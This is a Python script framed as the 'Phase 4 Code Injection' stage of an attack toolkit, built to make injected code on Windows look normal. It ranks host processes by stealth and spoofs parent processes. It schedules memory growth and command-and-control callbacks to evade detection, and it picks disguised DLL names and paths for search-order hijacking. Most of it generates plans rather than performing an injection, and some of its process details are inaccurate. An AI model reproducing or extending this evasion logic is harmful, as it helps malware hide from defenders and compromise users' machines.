#!/usr/bin/env python3
"""
Behavioral Camouflage System - Phase 4 Code Injection
Blends injection into normal process behavior patterns
"""

import ctypes
import logging
import random
import time
import subprocess
from typing import List, Optional, Dict
from dataclasses import dataclass
from enum import Enum

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
log = logging.getLogger("BehavioralCamouflage")


class CamouflageTechnique(Enum):
    """Behavioral camouflage techniques"""
    LEGITIMATE_THREAD_POOL = "thread_pool"  # Create threads that look legitimate
    DLL_SEARCH_ORDER = "dll_order"          # Abuse legitimate DLL search order
    SHELL_EXTENSION = "shell_ext"           # Inject as shell extension
    COM_MARSHALING = "com_marshaling"       # Use COM object marshaling
    WMI_EVENT_DRIVEN = "wmi_event"          # Trigger via WMI event subscription
    SCHEDULED_TASK = "scheduled_task"       # Inject via task scheduler
    LOGON_SCRIPT = "logon_script"           # Inject via logon script


@dataclass
class ProcessSignature:
    """Normal process behavior pattern"""
    process_name: str
    normal_thread_count: int
    expected_dlls: List[str]
    normal_parent: str
    memory_pattern: str  # "stable", "growing", "oscillating"
    network_behavior: str  # "quiet", "dns_only", "http_periodic"


class BehavioralCamouflageEngine:
    """
    Make injected code appear normal through behavioral mimicking
    
    Techniques:
    1. Parent-Child Relationships: Spoof legitimate parent processes
    2. Thread Patterns: Create realistic thread activity
    3. Memory Evolution: Grow/shrink memory gradually (not suddenly)
    4. Network Behavior: Mimic legitimate process C2 patterns
    5. Handle Patterns: Use legitimate API call sequences
    6. Timing Patterns: Execute at realistic times
    """
    
    # Process behavioral signatures (what's normal)
    PROCESS_SIGNATURES = {
        "explorer.exe": ProcessSignature(
            process_name="explorer.exe",
            normal_thread_count=8,
            expected_dlls=["SHELL32.dll", "USER32.dll", "GDI32.dll"],
            normal_parent="svchost.exe",
            memory_pattern="oscillating",  # Regularly fluctuates
            network_behavior="dns_only"
        ),
        "svchost.exe": ProcessSignature(
            process_name="svchost.exe",
            normal_thread_count=12,
            expected_dlls=["ntdll.dll", "kernel32.dll"],
            normal_parent="services.exe",
            memory_pattern="stable",
            network_behavior="quiet"
        ),
        "dllhost.exe": ProcessSignature(
            process_name="dllhost.exe",
            normal_thread_count=5,
            expected_dlls=["ole32.dll", "rpcrt4.dll"],
            normal_parent="svchost.exe",
            memory_pattern="stable",
            network_behavior="quiet"
        ),
    }
    
    def __init__(self):
        self.kernel32 = ctypes.WinDLL("kernel32", use_errno=True)
    
    def select_legitimate_target(self) -> str:
        """
        Select target process that won't raise suspicion
        
        Avoid:
        - Processes that normally don't create threads (notepad, calc)
        - Single-instance processes (csrss, lsass)
        - Processes with restricted imports (wininit)
        - Processes that lock/validate their code
        
        Prefer:
        - Multi-threaded processes (explorer, svchost, dllhost)
        - Processes that load many DLLs (higher chance injection uses new DLL)
        - Processes run under user context (multiple instances exist)
        - Background services (less visibility)
        
        Returns:
            Process name of legitimate target
        """
        
        # Ranked by stealth (higher = better)
        candidates = [
            ("svchost.exe", 10),        # Perfect: Multi-thread, user-mode, common
            ("dllhost.exe", 9),         # Great: COM hosting, multi-thread
            ("taskhost.exe", 8),        # Good: Task scheduler, multi-thread
            ("rundll32.exe", 7),        # Fair: Inherently spawns DLLs
            ("explorer.exe", 6),        # Risky: User can notice window changes
        ]
        
        # Weight-based selection
        total_weight = sum(w for _, w in candidates)
        choice_weight = random.uniform(0, total_weight)
        
        current = 0
        for process_name, weight in candidates:
            current += weight
            if choice_weight <= current:
                log.info(f"🎯 Selected legitimate target: {process_name}")
                return process_name
        
        return candidates[0][0]  # Default
    
    def create_realistic_parent_child(self, injected_process_name: str) -> str:
        """
        Spoof realistic parent process to hide injection
        
        Normal relationships:
        - explorer.exe → svchost.exe (Windows Update)
        - svchost.exe → services.exe
        - dllhost.exe → svchost.exe
        - rundll32.exe → explorer.exe or shell
        
        Args:
            injected_process_name: Name of process to be injected into
            
        Returns:
            Legitimate parent process name
        """
        
        parent_map = {
            "explorer.exe": "svchost.exe",
            "svchost.exe": "services.exe",
            "dllhost.exe": "svchost.exe",
            "taskhost.exe": "services.exe",
            "rundll32.exe": "explorer.exe",
        }
        
        parent = parent_map.get(injected_process_name, "services.exe")
        log.info(f"👪 Mapped {injected_process_name} → parent: {parent}")
        
        return parent
    
    def generate_realistic_thread_activity(self, process_name: str) -> Dict:
        """
        Generate realistic thread creation/activity pattern
        
        Returns:
            Thread activity pattern dictionary
        """
        
        signature = self.PROCESS_SIGNATURES.get(process_name)
        if not signature:
            signature = self.PROCESS_SIGNATURES["svchost.exe"]
        
        # Generate thread count that looks normal
        base_threads = signature.normal_thread_count
        variance = random.randint(-2, 3)  # Normal variance
        realistic_thread_count = max(base_threads + variance, base_threads - 2)
        
        # Generate thread activity timeline
        activity_pattern = [
            {"time_offset_ms": 0, "action": "create_thread", "count": 2},
            {"time_offset_ms": random.randint(50, 200), "action": "create_thread", "count": 1},
            {"time_offset_ms": random.randint(200, 500), "action": "wait_on_event"},
            {"time_offset_ms": random.randint(500, 2000), "action": "terminate_thread", "count": 1},
        ]
        
        log.info(f"📊 Generated realistic thread pattern for {process_name}:")
        log.info(f"   Expected threads: {realistic_thread_count}")
        log.info(f"   Activity: {len(activity_pattern)} events")
        
        return {
            "process_name": process_name,
            "expected_thread_count": realistic_thread_count,
            "activity_timeline": activity_pattern,
        }
    
    def generate_realistic_memory_growth(self, injected_size_kb: int) -> Dict:
        """
        Generate realistic memory growth pattern
        
        Instead of allocating all memory at once (suspicious spike),
        grow gradually like normal process memory growth.
        
        Args:
            injected_size_kb: Total size to allocate
            
        Returns:
            Memory growth schedule (time, size_kb, type)
        """
        
        # Start with immediate small allocation (normal)
        allocations = [
            {"time_ms": 0, "size_kb": 512, "type": "immediate"},
        ]
        
        # Grow gradually over time
        remaining = injected_size_kb - 512
        block_size = 256
        time_offset = 100
        
        while remaining > 0:
            alloc_size = min(block_size, remaining)
            allocations.append({
                "time_ms": time_offset,
                "size_kb": alloc_size,
                "type": "gradual"
            })
            remaining -= alloc_size
            time_offset += random.randint(200, 800)  # Irregular intervals
        
        log.info(f"📈 Memory growth schedule: {len(allocations)} allocations over {time_offset}ms")
        
        return {
            "total_size_kb": injected_size_kb,
            "allocations": allocations,
        }
    
    def generate_realistic_c2_pattern(self, process_name: str) -> Dict:
        """
        Generate C2 communication pattern that blends with normal traffic
        
        Args:
            process_name: Target process name
            
        Returns:
            C2 communication pattern dictionary
        """
        
        signature = self.PROCESS_SIGNATURES.get(process_name)
        if not signature:
            signature = ProcessSignature("unknown", 0, [], "", "stable", "quiet")
        
        # Adjust pattern based on process
        if signature.network_behavior == "quiet":
            # Almost no network activity
            c2_pattern = {
                "frequency": "rare",
                "interval_minutes": random.randint(60, 240),
                "dns_queries": False,  # Avoid DNS
                "http_requests": False,
                "https_only": True,
                "callback_interval": "every 2-4 hours",
            }
        elif signature.network_behavior == "dns_only":
            # Occasional DNS (normal for explorer)
            c2_pattern = {
                "frequency": "occasional",
                "interval_minutes": random.randint(20, 60),
                "dns_queries": True,
                "http_requests": False,
                "https_only": True,
                "callback_interval": "every 30-60 minutes",
            }
        else:
            # Regular network activity
            c2_pattern = {
                "frequency": "regular",
                "interval_minutes": random.randint(5, 15),
                "dns_queries": True,
                "http_requests": True,
                "https_only": False,
                "callback_interval": "every 10-30 minutes",
            }
        
        log.info(f"📡 Generated C2 pattern for {process_name}:")
        log.info(f"   Frequency: {c2_pattern['frequency']}")
        log.info(f"   Interval: every {c2_pattern['interval_minutes']} minutes")
        
        return c2_pattern
    
    def simulate_DLL_search_order_abuse(self, target_process: str, dll_name: str = "helper.dll") -> str:
        """
        Use legitimate DLL search order to inject without obvious hook
        
        Technique: Place malicious DLL in location searched before system32
        Normal search order: CurrentDir, AppDir, SystemDir, Windows
        
        Exploit: Put payload in AppDir with common name (e.g., "helper.dll")
        Process loads it legitimately thinking it's valid
        
        Args:
            target_process: Process to inject into
            dll_name: Name of DLL to inject
            
        Returns:
            Path where DLL should be placed
        """
        
        # Get process directory
        process_dirs = {
            "explorer.exe": "C:\\Windows",
            "svchost.exe": "C:\\Windows\\system32",
            "dllhost.exe": "C:\\Windows\\system32",
        }
        
        base_dir = process_dirs.get(target_process, "C:\\Windows\\Temp")
        
        # Use common DLL name that won't raise suspicion
        common_dlls = [
            "shell32_helper.dll",
            "advapi_helper.dll",
            "kernel32_ext.dll",
            "mscoree_compat.dll",
        ]
        
        chosen_dll = random.choice(common_dlls)
        path = f"{base_dir}\\{chosen_dll}"
        
        log.info(f"🔗 DLL Search Order Abuse:")
        log.info(f"   Target: {target_process}")
        log.info(f"   DLL: {chosen_dll}")
        log.info(f"   Placement: {path}")
        
        return path
    
    def generate_handle_sequence(self) -> List[str]:
        """
        Generate realistic sequence of Windows API calls
        
        Legit process would call:
        1. OpenProcess
        2. LoadLibrary (if loading DLL)
        3. VirtualAlloc (memory allocation)
        4. WriteProcessMemory (write data)
        5. CreateRemoteThread (execute)
        6. WaitForSingleObject (wait for completion)
        7. CloseHandle
        
        But might also call:
        - RegOpenKey, RegQueryValue (registry access)
        - CreateFile, ReadFile (file I/O)
        - GetProcAddress (API resolution)
        
        Returns:
            Realistic API call sequence
        """
        
        sequences = [
            ["OpenProcess", "GetProcAddress", "VirtualAlloc", "WriteProcessMemory"],
            ["LoadLibrary", "GetProcAddress", "CallbackFunction"],
            ["CreateFile", "ReadFile", "CloseHandle", "VirtualAlloc"],
        ]
        
        chosen = random.choice(sequences)
        log.info(f"📋 Generated API call sequence: {' → '.join(chosen)}")
        
        return chosen


if __name__ == "__main__":
    camouflage = BehavioralCamouflageEngine()
    
    target = camouflage.select_legitimate_target()
    print(f"✅ Selected target: {target}")
    
    thread_pattern = camouflage.generate_realistic_thread_activity(target)
    print(f"✅ Thread pattern: {thread_pattern['expected_thread_count']} threads")
    
    c2_pattern = camouflage.generate_realistic_c2_pattern(target)
    print(f"✅ C2 pattern: {c2_pattern['frequency']} ({c2_pattern['interval_minutes']}min)")
